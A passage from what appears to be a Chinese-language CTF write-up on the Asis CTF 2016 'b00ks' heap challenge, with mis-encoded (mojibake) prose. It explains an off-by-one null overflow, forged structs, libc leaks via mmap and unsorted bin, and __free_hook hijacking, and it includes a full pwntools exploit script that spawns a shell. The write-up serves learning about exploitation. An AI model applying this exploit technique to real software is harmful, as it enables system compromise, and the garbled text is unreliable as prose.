æ­¤æ ¹æ® <code>book[0]</code> å­˜å‚¨çš„æŒ‡é’ˆæˆ‘ä»¬å¯ä»¥æ¨ç®—å‡º <code>book[1]</code> å­˜å‚¨çš„æŒ‡é’ˆï¼Œå³ï¼š<code>book[1] = book[0] + 0x30</code></p><p>ç”±äºè¿™ä¸ªé¢˜å¼€å¯äº† PIEï¼Œæˆ‘ä»¬æš‚æ—¶æ— æ³•æ³„éœ² libc çš„åŸºåœ°å€</p><p>ä½†å‘ç° <code>Create()</code> åˆ›å»ºä¹¦çš„æ—¶å€™ï¼Œå¤§å°æ˜¯ç”±æˆ‘ä»¬æ§åˆ¶çš„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks20.png" alt="ã€Asis CTF 2016ã€‘b00ks20.png"></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥è®©å †ä»¥ <code>mmap</code> æ¨¡å¼è¿›è¡Œæ‹“å±•ï¼Œå³ï¼šè®¾å®šä¸€ä¸ªå¾ˆå¤§çš„å°ºå¯¸ï¼ˆå¤§äºç­‰äº <code>128KB</code>ï¼‰ï¼Œåˆ›å»ºä¸€ä¸ª <code>book[1]</code></p><blockquote><p>å› ä¸º <code>brk</code> æ˜¯ç›´æ¥æ‹“å±•åŸæ¥çš„å †ï¼Œè€Œ <code>mmap</code> ä¼šå•ç‹¬æ˜ å°„ä¸€å—å†…å­˜</p><p><strong><code>mmap</code> åˆ†é…çš„å†…å­˜ä¸ libc ä¹‹å‰å­˜åœ¨å›ºå®šçš„åç§»ï¼Œå› æ­¤å¯ä»¥æ¨ç®—å‡º libc çš„åŸºåœ°å€</strong></p></blockquote><p>ç”±äºæˆ‘ä»¬è¿˜å¯ä»¥å†æ¬¡ä½¿ç”¨ <code>Change()</code> åŠŸèƒ½æ¥å†™å…¥ä½œè€…å <code>author name</code>ï¼Œæ­¤æ—¶å¦‚æœå†™å…¥ 0x20 å­—èŠ‚ï¼Œåˆ™æº¢å‡ºçš„ä¸€å­—èŠ‚ <code>&#39;\x00&#39;</code> ä¼šç›´æ¥å°†å·²æœ‰çš„ <code>book[0]</code> å­˜å‚¨çš„æŒ‡é’ˆæœ€ä½ä½è¦†ç›–æ‰ï¼Œä»è€Œæ”¹å˜äº† <code>book[0]</code> æŒ‡å‘å †ä¸­çš„åœ°å€</p><p>å¯ä»¥çœ‹åˆ°ï¼ŒåŸæœ¬ <code>book[0]</code> å­˜å‚¨çš„æŒ‡é’ˆæœ€ä½ä½ä¸º <code>&#39;\x60&#39;</code>ï¼Œæ­¤æ—¶å·²è¢«è¦†ç›–ä¸º <code>&#39;\x00&#39;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks25.png" alt="ã€Asis CTF 2016ã€‘b00ks25.png"></p><p>è¿›è€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>Edit()</code> åŠŸèƒ½ä¿®æ”¹ <code>book[0] -&gt; description</code> çš„å†…å®¹æ¥ä¼ªé€  <code>book[0]</code> çš„ç»“æ„ä½“ï¼Œæ­¤æ—¶ä¼ªé€ çš„ <code>book[0] -&gt; name</code> å’Œ <code>book[0] -&gt; description</code> éƒ½å¯ä»¥ç”±æˆ‘ä»¬æ¥å®šä¹‰</p><blockquote><p>æ³¨æ„ï¼š</p><p>ç”±äºæˆ‘ä»¬è¦†ç›–äº†åŸæœ¬ <code>book[0]</code> å­˜å‚¨çš„æŒ‡é’ˆæœ€ä½ä½ä¸º <code>&#39;\x00&#39;</code>ï¼Œå› æ­¤ä¼ªé€ çš„ <code>book[0]</code> ç»“æ„ä½“é¦–åœ°å€åº”è¯¥åœ¨åœ°å€æœ€ä½ä½ä¸º <code>&#39;\x00&#39;</code> çš„åœ°æ–¹ï¼Œåç§»ä¸º 0x40ï¼Œå› æ­¤å…ˆå¡«å…… 0x40 çš„åƒåœ¾æ•°æ®</p></blockquote><p>ä¼ªé€ å‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks23.png" alt="ã€Asis CTF 2016ã€‘b00ks23.png"></p><p>ä¼ªé€ åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks24.png" alt="ã€Asis CTF 2016ã€‘b00ks24.png"></p><p>è¿™é‡Œæˆ‘ä»¬å°†ä¼ªé€ çš„ <code>book[0] -&gt; name</code> å’Œ <code>book[0] -&gt; description</code> éƒ½è®¾ç½®ä¸º <code>book[1]</code> çš„ <code>book[1] -&gt; name</code> çš„åœ°å€</p><p>å› ä¸ºæ­¤æ—¶æˆ‘ä»¬åªè¦èƒ½æ³„éœ² <code>book[1] -&gt; name</code> å°±å¯ä»¥é€šè¿‡ <code>book[1] -&gt; name</code> ä¸ libc åŸºåœ°å€çš„åç§»æ¥è®¡ç®—å‡º libc åŸºåœ°å€äº†</p><p>é€šè¿‡ GDB å¾—åˆ° <code>book[1] -&gt; name</code> ä¸ libc åŸºåœ°å€çš„åç§»ä¸º <code>0x5b0010</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks26.png" alt="ã€Asis CTF 2016ã€‘b00ks26.png"></p><p>åˆ©ç”¨ <code>(book[1] -&gt; name) - 0x5b0010</code> æ³„éœ²å‡º libc åŸºåœ°å€åï¼Œç›´æ¥åŠ«æŒ <code>__free_hook</code> ä¸º <code>system()</code> åœ°å€ï¼Œç„¶åé€šè¿‡ <code>Delete()</code> åŠŸèƒ½è°ƒç”¨ <code>free()</code> å®ç° <code>system(/bin/sh)</code></p><p>ä¹Ÿå¯ä»¥ç›´æ¥åŠ«æŒ <code>__free_hook</code> ä¸º one_gadget æ¥ getshell</p><hr><h1 id="è„šæœ¬ä¸€"><a href="#è„šæœ¬ä¸€" class="headerlink" title="è„šæœ¬ä¸€"></a>è„šæœ¬ä¸€</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Create</span><span class="token punctuation">(</span>name_size<span class="token punctuation">,</span> name<span class="token punctuation">,</span> des_size<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>des_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>book_id<span class="token punctuation">,</span> new_des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Change</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Enter author name: '</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>   <span class="token comment"># å°† author name çš„ç©ºé—´å¡«å……æ»¡ï¼Œä½¿å…¶ä¸å­˜åœ¨ '\x00'</span>Create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'bbbb'</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">)</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>book1_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book1_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book1_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>book2_addr <span class="token operator">=</span> book1_addr <span class="token operator">+</span> <span class="token number">0x30</span>   <span class="token comment"># æ ¹æ®è°ƒè¯•å¯çŸ¥ï¼Œä¸¤ä¸ªå †å—ä¹‹é—´çš„åç§»ä¸º 0x30</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book2_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Create<span class="token punctuation">(</span><span class="token number">0x21000</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">,</span> <span class="token number">0x21000</span><span class="token punctuation">,</span> <span class="token string">b'dddd'</span><span class="token punctuation">)</span>   <span class="token comment"># ä»¥ mmap æ–¹å¼åˆ›å»ºå †å—</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>   <span class="token comment"># ä¼ªé€  book[0]</span><span class="token comment"># debug()</span>Change<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>   <span class="token comment"># è¦†ç›– book[0] çš„æœ€ä½ä½ï¼Œæ”¹å˜å…¶æŒ‡å‘çš„åœ°å€ä¸ºä¼ªé€ çš„ book[0]</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>book2_name_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># æ³„éœ²å‡º book[1] -> name</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book2_name_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_name_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> book2_name_addr <span class="token operator">-</span> <span class="token number">0x5b0010</span>   <span class="token comment"># æ ¹æ®åç§»è®¡ç®— libc åŸºåœ°å€</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4527a</span>   <span class="token comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># system(/bin/sh) å’Œ one_gadget é€‰å…¶ä¸€å³å¯</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Edit(1, p64(0) + p64(free_hook_addr))</span><span class="token comment"># Edit(2, p64(one_gadget_addr))</span>Delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»“æœä¸€"><a href="#ç»“æœä¸€" class="headerlink" title="ç»“æœä¸€"></a>ç»“æœä¸€</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks27.png" alt="ã€Asis CTF 2016ã€‘b00ks27.png"></p><hr><h1 id="æ€è·¯äºŒï¼ˆunsorted-binï¼‰"><a href="#æ€è·¯äºŒï¼ˆunsorted-binï¼‰" class="headerlink" title="æ€è·¯äºŒï¼ˆunsorted binï¼‰"></a>æ€è·¯äºŒï¼ˆunsorted binï¼‰</h1><blockquote><p>æœ¬åœ°ç¯å¢ƒï¼šGlibc 2.23</p></blockquote><p>æ ¹æ®å‰é¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“ï¼Œå…³é”®åœ¨äºå¦‚ä½•æ³„éœ² libc çš„åŸºåœ°å€</p><p>åœ¨æ€è·¯ä¸€ä¸­ï¼Œé€šè¿‡ <code>mmap</code> æ–¹å¼åˆ†é…çš„å †åœ°å€ä¸ libc åŸºåœ°å€å­˜åœ¨å›ºå®šçš„åç§»ï¼Œæ ¹æ®è¿™ä¸ªå›ºå®šåç§»æ¥è®¡ç®— libc åŸºåœ°å€</p><p><em>å¦ä¸€ç§æ–¹æ³•å°±æ˜¯åˆ©ç”¨ <code>unsorted bin</code> çš„ç‰¹ç‚¹æ¥æ³„éœ² libc åŸºåœ°å€</em></p><blockquote><p>å› ä¸º <code>unsorted bin</code> æ˜¯åŒå‘é“¾è¡¨ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ª <code>unsorted bin</code> çš„ <code>bk</code> ä¹Ÿå°±æŒ‡å‘äº† <code>bin[1]</code></p><p><strong>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ‰“å°å‡ºç¬¬ä¸€ä¸ª <code>unsorted bin</code> çš„ <code>bk</code>ï¼Œä¹Ÿå°±ç›¸å½“äºå¾—åˆ°äº† <code>bins[1]</code> åœ°å€ï¼Œè€Œ <code>bins[1]</code> åœ¨ libc ä¸­ï¼Œä¹Ÿå°±å¯ä»¥æ ¹æ®åç§»è®¡ç®— libc åŸºåœ°å€</strong></p></blockquote><p>è€Œå…³é”®åœ¨äºï¼šå¾—åˆ°ä¸€ä¸ª <code>unsorted bin</code> </p><p>æˆ‘ä»¬çŸ¥é“ï¼Œå½“Â <code>free</code>Â çš„Â <code>chunk</code>Â å¤§å° &gt;&#x3D; 144 å­—èŠ‚æ—¶ï¼Œ<code>chunk</code>Â ä¼šæ”¾åˆ°Â <code>unsorted bin</code> ä¸­</p><p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ›å»ºç¬¬äºŒæœ¬ä¹¦ï¼Œä½¿å…¶ <code>chunk</code> çš„å¤§å°åœ¨ <code>free</code> çš„æ—¶å€™å¤§äº 144 å­—èŠ‚ï¼Œè¿™æœ¬ä¹¦åœ¨åé¢æ˜¯éœ€è¦è¢« <code>free</code> å½¢æˆ <code>unsorted bin</code> çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å†åˆ›å»ºç¬¬ä¸‰æœ¬ä¹¦ï¼Œå†™å…¥ <code>&#39;/bin/sh&#39;</code></p><p>åˆ›å»ºä¸‰æœ¬ä¹¦åå¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks30.png" alt="ã€Asis CTF 2016ã€‘b00ks30.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks28.png" alt="ã€Asis CTF 2016ã€‘b00ks28.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks29.png" alt="ã€Asis CTF 2016ã€‘b00ks29.png"></p><p>æ¥ç€è¿˜æ˜¯é€šè¿‡ <code>Edit()</code> åŠŸèƒ½ä¼ªé€ ä¸€ä¸ª <code>book[0]</code></p><ul><li><p>è¿™æ¬¡ä¼ªé€ çš„ <code>book[0] -&gt; name</code> æŒ‡å‘å³å°† <code>free</code> åå½¢æˆçš„ <code>unsorted bin</code> çš„ <code>bk</code> åœ°å€ï¼ˆ<strong>æ³¨æ„ï¼šå›¾ä¸­å’Œè„šæœ¬ä¸­å®é™…æŒ‡å‘çš„æ˜¯ <code>fd</code> åœ°å€ï¼Œä½†ç”±äºè¿™é‡Œåªå­˜åœ¨ä¸€ä¸ª unsorted binï¼Œå› æ­¤ <code>fd</code> ä¸ <code>bk</code> æŒ‡å‘åŒä¸€åœ°å€ï¼Œæ•…ä¸å½±å“</strong>ï¼‰</p></li><li><p>ä¸ºäº†ä¾¿äºåŠ«æŒ <code>__free_hook</code> ä¸º <code>system()</code>ï¼Œæˆ‘ä»¬å°†ä¼ªé€ çš„ <code>book[0] -&gt; description</code> æŒ‡å‘ <code>book[2]</code> çš„ <code>description</code></p><p>  è¿™æ ·æˆ‘ä»¬é€šè¿‡ <code>Edit(1, p64(free_hook_addr) + p64(0x10))</code> ä¿®æ”¹ <code>book[0]</code> çš„ <code>description</code> çš„æ—¶å€™ï¼Œå°±å¯ä»¥å°† <code>book[2] -&gt; description</code> ä¿®æ”¹ä¸º <code>__free_hook</code></p><p>  ç„¶åå†é€šè¿‡ <code>Edit(3, p64(system_addr))</code> ä¿®æ”¹ <code>book[2]</code> çš„ <code>description</code> çš„æ—¶å€™ï¼Œå°±å¯ä»¥å°† <code>__free_hook</code> ä¿®æ”¹ä¸º <code>system()</code></p></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks31.png" alt="ã€Asis CTF 2016ã€‘b00ks31.png"></p><p>ä¼ªé€ å¥½ <code>book[0]</code> åï¼Œé€šè¿‡ <code>Change()</code> åŠŸèƒ½å¡«å…… 0x20 å­—èŠ‚ï¼Œæº¢å‡º 1 å­—èŠ‚ <code>&#39;\x00&#39;</code> è¦†ç›– <code>book[0]</code> æŒ‡é’ˆçš„æœ€ä½ä½ï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ <code>book[0]</code></p><p>ç„¶å <code>free</code> æ‰ <code>book[1]</code> åå½¢æˆ <code>unsorted bin</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks32.png" alt="ã€Asis CTF 2016ã€‘b00ks32.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks33.png" alt="ã€Asis CTF 2016ã€‘b00ks33.png"></p><p>å¯ä»¥çœ‹åˆ° <code>bk</code> å’Œ <code>fd</code> æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªåœ°å€ï¼Œæ‰“å°å…¶ä¸­ä¹‹ä¸€å³å¯</p><p>é€šè¿‡ <code>Print()</code> åŠŸèƒ½åœ¨ <code>Name</code> å¤„æ‰“å°å‡ºäº† <code>fd</code>ã€<code>bk</code> æŒ‡é’ˆ</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks34.png" alt="ã€Asis CTF 2016ã€‘b00ks34.png"></p><p>é€šè¿‡ GDB å¯ä»¥çœ‹åˆ° <code>fd</code>ã€<code>bk</code> æŒ‡é’ˆæŒ‡å‘çš„åœ°å€ä¸º <code>main_arena + 88</code> å¤„</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks35.png" alt="ã€Asis CTF 2016ã€‘b00ks35.png"></p><p>åŒæ—¶ <code>main_arena</code> ä¸ <code>__malloc_hook</code> ç›¸è· 0x10</p><p>å› æ­¤æ ¹æ®åç§»å¯ä»¥è·å¾— <code>__malloc_hook</code> çš„çœŸå®åœ°å€ï¼Œè€Œ <code>__malloc_hook</code> æ˜¯ libc ä¸­çš„å‡½æ•°ï¼Œæ ¹æ® libc åç§»å³å¯è·å¾— libc åŸºåœ°å€</p><p>æœ€åï¼Œåˆ©ç”¨å‰é¢æåˆ°çš„ä¸¤æ¬¡ <code>Edit()</code> åŠ«æŒ <code>__free_hook</code> ä¸º <code>system()</code></p><ol><li>ç¬¬ä¸€æ¬¡ <code>Edit()</code> å°† <code>book[2] -&gt; description</code> ä¿®æ”¹ä¸º <code>__free_hook</code>ï¼š</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks36.png" alt="ã€Asis CTF 2016ã€‘b00ks36.png"></p><ol start="2"><li>ç¬¬äºŒæ¬¡ <code>Edit()</code> å°† <code>__free_hook</code> ä¿®æ”¹ä¸º <code>system()</code>ï¼š</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks37.png" alt="ã€Asis CTF 2016ã€‘b00ks37.png"></p><p>ç„¶åé€šè¿‡ 